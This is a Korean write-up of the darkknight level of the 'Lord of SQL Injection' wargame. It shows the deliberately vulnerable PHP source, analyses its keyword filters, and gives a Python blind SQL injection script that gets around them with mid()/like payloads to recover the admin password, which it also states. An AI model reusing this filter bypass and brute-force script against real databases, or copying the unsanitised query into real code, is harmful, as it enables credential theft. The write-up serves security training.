## Lord of SQL Injection No. 12- darknight
## 문제 출제 의도
1. Query 이해도 확인.
2. 지금 까지의 SQL Injection의 이해도 확인. 
## 소스 코드
~~~   
<?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
    if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
    if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
    $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
    highlight_file(__FILE__); 
?>
~~~
## 분석 결론
+ 금지 문자, 문자열
    - GET 방식으로 받은 no값에 'prob _ . ()중 하나라도 있다면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
    - GET 방식으로 받은 no값에 'ascii, =, substr, =중 하나라도 있다면 "HeHe"가 출력되고 문제 풀이에 실패한다.
    - GET 방식으로 받은 pw값에 '(single quote)가 있다면 "HeHe"가 출력되고 문제 풀이에 실패한다.
+ pw
    - pw에 특수문자를 입력해도 특수문자 처리가 되지 않는다.
+ 풀이 성공 조건
    - 입력한 pw와 데이터 베이스에서 받아 온 실제 pw가 같아야 한다.
## 문제 해결
1. Blind SQL Injection
    - 다음과 유사한 방법으로 pw값을 알 수 있다.
    ~~~
    import urllib.request
    from urllib.parse import quote

    key = ""
    for i in range(1, 9):
        for j in range(48, 127):
            url = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="
            data = '1 or id like "admin" and mid(pw,1,{}) like "{}"#'.format(str(i), key + chr(j))
            print(data)
            data = quote(data)
            re = urllib.request.Request(url + data)
            re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
            re.add_header("Cookie", "PHPSESSID=6ckrsnfovcd74972o80ugmksb4")
            res = urllib.request.urlopen(re) 
            if str(res.read()).find("Hello admin") != -1:
                key += chr(j).lower()
                print(key)
                break
    print(key)
    ~~~ 
    - 이는 "1c62ba6f"을 출력한다.
    - 이를 GET방식으로 pw에 입력하면 문제 풀이에 성공한다.